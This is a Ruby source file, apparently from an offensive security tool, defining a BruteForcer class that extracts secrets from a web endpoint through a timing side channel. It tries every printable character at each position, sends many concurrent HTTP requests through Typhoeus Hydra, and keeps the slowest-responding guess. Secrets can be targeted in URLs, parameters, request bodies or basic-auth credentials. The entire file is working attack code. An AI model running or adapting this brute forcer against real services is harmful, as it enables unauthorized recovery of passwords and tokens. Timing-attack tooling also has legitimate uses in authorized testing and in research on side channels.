module TimingAttack
  class BruteForcer
    include TimingAttack::Attacker

    def initialize(options: {})
      @options = default_options.merge(options)
      raise ArgumentError.new("Must provide :url key") if url.nil?
      raise ArgumentError.new("No fields specified for brute forcing") unless specified_brute_force_field?
      @known = ""
    end

    private

    attr_reader :known
    POTENTIAL_BYTES = (' '..'z').to_a
    def attack!
      begin
        while(true)
          attack_byte!
        end
      rescue Errors::BruteForcerError => e
        puts "\n#{e.message}"
        exit(1)
      end
    end

    def attack_byte!
      @attacks = POTENTIAL_BYTES.map do |byte|
        TimingAttack::TestCase.new(input: "#{known}#{byte}",
                                   options: options)
      end
      run_attacks_for_single_byte!
      process_attacks_for_single_byte!
    end

    def run_attacks_for_single_byte!
      hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
      iterations.times do
        attacks.each do |attack|
          req = attack.generate_hydra_request!
          req.on_complete do |response|
            print "\r#{' ' * (known.length + 4)}"
            output.increment
            print " '#{known}'"
          end
          hydra.queue req
        end
      end
      hydra.run
    end

    def process_attacks_for_single_byte!
      attacks.each(&:process!)
      grouper = Grouper.new(attacks: attacks, group_by: { percentile: options.fetch(:percentile) })
      results = grouper.long_tests.map(&:input)
      if grouper.long_tests.count > 1
        msg = "Got too many possibilities to continue brute force:\n\t"
        msg << results.join("\t")
        raise Errors::BruteForcerError.new(msg)
      end
      @known = results.first
    end

    def output
      @output ||= TimingAttack::Spinner.new
    end

    def field_is_brute_forceable?(obj)
      case obj
      when String
        obj.include?(INPUT_FLAG)
      when Symbol
        field_is_brute_forceable?(obj.to_s)
      when Array
        obj.any? {|el| field_is_brute_forceable?(el) }
      when Hash
        field_is_brute_forceable?(obj.keys) || field_is_brute_forceable?(obj.values)
      end
    end

    def specified_brute_force_field?
      brute_fields = [ options[:basic_auth_password], options[:basic_auth_username],
                      options[:body], options[:params], options[:url] ]
      brute_fields.any? { |field| field_is_brute_forceable?(field) }
    end
  end
end
